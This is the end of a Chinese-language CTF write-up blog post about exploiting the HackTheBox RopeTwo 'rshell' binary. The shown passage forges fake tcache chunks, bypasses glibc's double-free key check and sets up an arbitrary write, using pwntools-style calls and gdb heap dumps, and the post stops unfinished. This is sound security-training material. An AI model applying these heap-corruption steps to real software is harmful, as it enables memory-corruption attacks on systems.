<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0x55555555c250: 0x0000000000000000      0x0000000000000051</span><br><span class="line">0x55555555c260: 0x0000000000000000      0x000055555555c010</span><br><span class="line">0x55555555c270: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c280: 0x0000000000000000      0x0000000000000061</span><br><span class="line">0x55555555c290: 0x0000000000000000      0x000000000000000a</span><br><span class="line">0x55555555c2a0: 0x0000000000000000      0x0000000000000051</span><br><span class="line">0x55555555c2b0: 0x000055555555c290      0x000055555555c010  &lt;-- now points to fake chunk</span><br><span class="line">0x55555555c2c0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c2d0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c2e0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c2f0: 0x0000000000000000      0x0000000000020d11</span><br></pre></td></tr></table></figure>

<p>heapinfo也显示了这个:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(0x50)   tcache_entry[3](2): 0x55555555c2b0 --&gt; 0x55555555c290 (overlap chunk with 0x55555555c2a0(freed) )</span><br></pre></td></tr></table></figure>

<p>如果想要访问这个块，首先需要去掉2b0。不能把它拿出来释放，否则它会回到原来的地方。所以会得到它，把它编辑成更小的大小，然后释放它，让两个更小的块进入tcache，留下假块准备好被使用。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="string">&#x27;B3&#x27;</span>, 0x40)                                 <span class="comment"># fake in 0x50 tcache, f2 -&gt; B</span></span><br><span class="line">edit(<span class="string">&#x27;B3&#x27;</span>, 0x20)                                <span class="comment"># B-end in 0x20 tcache</span></span><br><span class="line">rm(<span class="string">&#x27;B3&#x27;</span>)                                        <span class="comment"># B in 0x30 tcache</span></span><br></pre></td></tr></table></figure>

<p>现在，将添加一个0x40条目，它将返回290，可以使用它覆盖到b中。在这样做之前，有另一个问题。想释放B2，但不能，因为它会返回一个双自由错误。它正在检查size元数据后面0x10的键，所以需要更改它。幸运的是，有了新的重叠部分。因此，将创建它，使它保持0x51不变，为下一个tcache添加一个null，并更改键。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="string">&#x27;fake1&#x27;</span>, 0x40, p64(0)*3 + p64(0x51) + p64(0))</span><br></pre></td></tr></table></figure>

<p>现在堆显示key不再匹配坏值:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0x55555555c250: 0x0000000000000000      0x0000000000000051</span><br><span class="line">0x55555555c260: 0x0000000000000000      0x000055555555c010</span><br><span class="line">0x55555555c270: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c280: 0x0000000000000000      0x0000000000000061</span><br><span class="line">0x55555555c290: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c2a0: 0x0000000000000000      0x0000000000000051</span><br><span class="line">0x55555555c2b0: 0x0000000000000000      0x000055555555000a  &lt;-- no pointer and key ends <span class="keyword">in</span> <span class="string">&quot;\x00\x0a&quot;</span> and not <span class="string">&quot;\xc0\x10&quot;</span></span><br><span class="line">0x55555555c2c0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c2d0: 0x0000000000000000      0x0000000000000021</span><br><span class="line">0x55555555c2e0: 0x0000000000000000      0x000055555555c010</span><br><span class="line">0x55555555c2f0: 0x0000000000000000      0x0000000000020d11</span><br></pre></td></tr></table></figure>

<p>将释放B2和fake1，它们都进入tcache，需要一种向任意地址写入的方法时，可以在最后使用它们。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rm(<span class="string">&#x27;fake1&#x27;</span>)</span><br><span class="line">rm(<span class="string">&#x27;B2&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>tcache现在看起来像:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(0x20)   tcache_entry[0](1): 0x55555555c2e0</span><br><span class="line">(0x30)   tcache_entry[1](1): 0x55555555c2b0 (overlap chunk with 0x55555555c2d0(freed) )</span><br><span class="line">(0x50)   tcache_entry[3](1): 0x55555555c2b0 (overlap chunk with 0x55555555c2d0(freed) )</span><br><span class="line">(0x60)   tcache_entry[4](1): 0x55555555c290 (overlap chunk with 0x55555555c2d0(freed) )</span><br></pre></td></tr></table></figure>

<ul>
<li>第二假块</li>
</ul>
<p>现在，将用大致相同的方式创建另一个假块 (在间隔一些时间之后):</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<p>未完持续。。。</p>

    </div>

    
    
    
        <div class="reward-container">
  <div></div>
  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
    Donate
  </button>
  <div id="qr" style="display: none;">
      
      <div style="display: inline-block;">
        <img src="/images/wechatpay.png" alt="lUc1f3r11 WeChat Pay">
        <p>WeChat Pay</p>
      </div>
      
      <div style="display: inline-block;">
        <img src="/images/alipay.png" alt="lUc1f3r11 Alipay">
        <p>Alipay</p>
      </div>

  </div>
</div>

        

<div>
<ul class="post-copyright">
  <li class="post-copyright-author">
    <strong>Post author:  </strong>lUc1f3r11
  </li>
  <li class="post-copyright-link">
    <strong>Post link: </strong>
    <a href="https://fdlucifer.github.io/2021/02/18/hackthebox-rope2-rshell-exploit/" title="HackTheBox-RopeTwo-[pwn-rshell]">https://fdlucifer.github.io/2021/02/18/hackthebox-rope2-rshell-exploit/</a>
  </li>
  <li class="post-copyright-license">
    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC8="><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> unless stating additionally.
  </li>
</ul>
</div>

        

  <div class="followme">
    <p>Welcome to my other publishing channels</p>

    <div class="social-list">

        <div class="social-item">
          <a target="_blank" class="social-link" href="https://twitter.com/fdlucifer11">
            <span class="icon">
              <i class="fab fa-twitter"></i>
            </span>

            <span class="label">Twitter</span>
          </a>
        </div>

        <div class="social-item">
          <a target="_blank" class="social-link" href="https://t.me/FDkiller">
            <span class="icon">
              <i class="fab fa-telegram"></i>
            </span>

            <span class="label">Telegram</span>
          </a>
        </div>

        <div class="social-item">
          <a target="_blank" class="social-link" href="/images/wechat_channel.jpg">
            <span class="icon">
              <i class="fab fa-weixin"></i>
            </span>

            <span class="label">WeChat</span>
          </a>
        </div>
    </div>
  </div>


      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/pwn/" rel="tag"># pwn</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2021/02/15/Exploiting-the-Math-expm1-typing-bug-in-V8/" rel="prev" title="利用V8中的Math-expm1-typing漏洞">
      <i class="fa fa-chevron-left"></i> 利用V8中的Math-expm1-typing漏洞
    </a></div>
      <div class="post-nav-item"></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%8B%E8%BD%BDbinary%E6%96%87%E4%BB%B6%E5%88%86%E6%9E%90"><span class="nav-number">2.</span> <span class="nav-text">下载binary文件分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%BB%E8%A6%81%E5%BE%AA%E7%8E%AF"><span class="nav-number">3.</span> <span class="nav-text">主要循环</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Commands"><span class="nav-number">4.</span> <span class="nav-text">Commands</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%85%8D%E7%BD%AE"><span class="nav-number">5.</span> <span class="nav-text">配置</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%BE%E5%9C%A8%E4%B8%80%E8%B5%B7"><span class="nav-number">6.</span> <span class="nav-text">放在一起</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B3%A8%E9%87%8A"><span class="nav-number">7.</span> <span class="nav-text">注释</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BC%B1%E7%82%B9"><span class="nav-number">8.</span> <span class="nav-text">弱点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9C%A8%E5%A0%86%E4%B8%8A%E5%BE%97%E5%88%B0libc"><span class="nav-number">9.</span> <span class="nav-text">在堆上得到libc</span></a></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="lUc1f3r11"
      src="/images/lucifer11.jpg">
  <p class="site-author-name" itemprop="name">lUc1f3r11</p>
  <div class="site-description" itemprop="description">all things about infosec & ctf</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">132</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">29</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">39</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;FDlucifer"><i class="fab fa-github fa-fw"></i>GitHub</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="bWFpbHRvOjExODUxNTE4NjdAcXEuY29t" title="E-Mail → mailto:1185151867@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;fdlucifer11"><i class="fab fa-twitter fa-fw"></i>Twitter</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDAxOTY5NDUyODYyMA==" title="FB Page → https:&#x2F;&#x2F;www.facebook.com&#x2F;profile.php?id&#x3D;100019694528620"><i class="fab fa-facebook fa-fw"></i>FB Page</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vY2hhbm5lbC9VQ19saVRlaDRSMUZNYnBWeGxwTWUtdnc=" title="YouTube → https:&#x2F;&#x2F;www.youtube.com&#x2F;channel&#x2F;UC_liTeh4R1FMbpVxlpMe-vw"><i class="fab fa-youtube fa-fw"></i>YouTube</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS95YW5nODkyOS8=" title="Instagram → https:&#x2F;&#x2F;www.instagram.com&#x2F;yang8929&#x2F;"><i class="fab fa-instagram fa-fw"></i>Instagram</span>
      </span>
  </div>
  <div class="cc-license motion-element" itemprop="license">
    <span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC8="><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></span>
  </div>



      </div>
        <div class="back-to-top motion-element">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 2017 – 
  <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">lUc1f3r11</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
    <span title="Symbols count total">2.1m</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="Reading time total">31:08</span>
</div>
  <div class="powered-by">Powered by <span class="exturl theme-link" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl theme-link" data-url="aHR0cHM6Ly9tdXNlLnRoZW1lLW5leHQub3Jn">NexT.Muse</span>
  </div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>

<script src="/js/bookmark.js"></script>




  
  <script>
    (function(){
      var canonicalURL, curProtocol;
      //Get the <link> tag
      var x=document.getElementsByTagName("link");
		//Find the last canonical URL
		if(x.length > 0){
			for (i=0;i<x.length;i++){
				if(x[i].rel.toLowerCase() == 'canonical' && x[i].href){
					canonicalURL=x[i].href;
				}
			}
		}
    //Get protocol
	    if (!canonicalURL){
	    	curProtocol = window.location.protocol.split(':')[0];
	    }
	    else{
	    	curProtocol = canonicalURL.split(':')[0];
	    }
      //Get current URL if the canonical URL does not exist
	    if (!canonicalURL) canonicalURL = window.location.href;
	    //Assign script content. Replace current URL with the canonical URL
      !function(){var e=/([http|https]:\/\/[a-zA-Z0-9\_\.]+\.baidu\.com)/gi,r=canonicalURL,t=document.referrer;if(!e.test(r)){var n=(String(curProtocol).toLowerCase() === 'https')?"https://sp0.baidu.com/9_Q4simg2RQJ8t7jm9iCKT-xh_/s.gif":"//api.share.baidu.com/s.gif";t?(n+="?r="+encodeURIComponent(document.referrer),r&&(n+="&l="+r)):r&&(n+="?l="+r);var i=new Image;i.src=n}}(window);})();
  </script>




  
<script src="/js/local-search.js"></script>













  

  

</body>
</html>
